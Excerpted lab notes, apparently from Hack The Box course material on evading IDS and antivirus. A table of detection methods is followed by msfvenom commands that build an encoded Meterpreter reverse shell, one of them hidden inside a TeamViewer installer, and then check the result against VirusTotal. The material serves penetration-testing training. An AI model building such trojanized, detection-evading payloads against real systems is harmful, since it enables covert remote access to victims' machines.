...
<table border="1" cellpadding="6" cellspacing="0">
  ...
  <tbody>
    <tr>
      ...
      <td>
        The inspection of network packets and comparison against pre-built and predefined attack
        patterns known as signatures. Any 100% match against these signatures will generate alarms.
      </td>
    </tr>
    <tr>
      <td>Heuristic / Statistical Anomaly Detection</td>
      <td>
        Behavioral analysis against an established baseline, including modus-operandi signatures
        for known Advanced Persistent Threats (APTs). The baseline defines normal network behavior
        and commonly used protocols. Any deviation beyond defined thresholds will generate alarms.
      </td>
    </tr>
    <tr>
      <td>Stateful Protocol Analysis Detection</td>
      <td>
        Detection of protocol deviations by comparing events against pre-built profiles of
        generally accepted definitions of non-malicious activity.
      </td>
    </tr>
    <tr>
      <td>Live-monitoring and Alerting (SOC-based)</td>
      <td>
        Security analysts in a dedicated, in-house, or outsourced Security Operations Center (SOC)
        use live-feed monitoring tools to observe network activity and alerting systems. Analysts
        may manually respond to threats or allow automated response mechanisms to take action.
      </td>
    </tr>
  </tbody>
</table>
...
@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
...
@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
...
<img width="743" height="668" alt="image" src="https://github.com/user-attachments/assets/ae44ee8b-439d-4896-b00a-dab5be2c6f3d" />
...
@htb[/htb]$ mv test.rar test

<h3>Removing the .RAR Extension</h3>

@htb[/htb]$ mv test2.rar test2
...
@htb[/htb]$ msf-virustotal -k <API key> -f test2
